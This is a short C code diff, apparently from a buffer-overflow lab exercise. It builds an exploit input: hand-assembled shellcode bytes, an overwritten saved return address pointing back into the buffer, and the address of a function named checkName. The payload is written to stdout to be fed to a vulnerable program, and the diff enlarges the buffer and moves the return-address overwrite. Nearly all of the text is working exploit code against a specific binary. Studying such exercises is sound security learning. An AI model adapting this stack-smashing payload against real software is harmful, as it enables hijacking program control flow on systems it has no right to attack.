@@ -111,7 +111,7 @@ void fnCaseA(){
 	//jmp 0x400813 (absolute)  Need to subtract. So 1's complement after subtracting from 0x0600dee.
 	////////////////////////////////////////////
 
-	char inp[124] = "Arun\0\0""\xc6\x04\x25\xa4\x0d\x60\x00\x41""\xe9\x20\xfa\xdf\xff";
+	char inp[140] = "Arun\0\0""\xc6\x04\x25\xa4\x0d\x60\x00\x41""\xe9\x20\xfa\xdf\xff";
 	//Over writing the rip to return to buffer which contains above assembly code.
 	inp[104] = (char) 0xe6;
 	inp[105] = (char) 0x0d;
@@ -135,7 +135,20 @@ void fnCaseA(){
 	inp[82] = (char) 0x40;
 	inp[83] = (char) 0x00;
 
-	write(1,inp,124);
+	
+	//Over writing the rip to return to buffer which contains above assembly code.
+	inp[136] = (char) 0xe6;
+	inp[137] = (char) 0x0d;
+	inp[138] = (char) 0x60;
+	inp[139] = (char) 0x00;
+
+	// Writing the address of checkName
+	inp[96] = (char) 0x69;
+	inp[97] = (char) 0x08;
+	inp[98] = (char) 0x40;
+	inp[99] = (char) 0x00;
+	
+	write(1,inp,140);
 	fflush(stdout);
 	//inp[69] = '\0';
 }
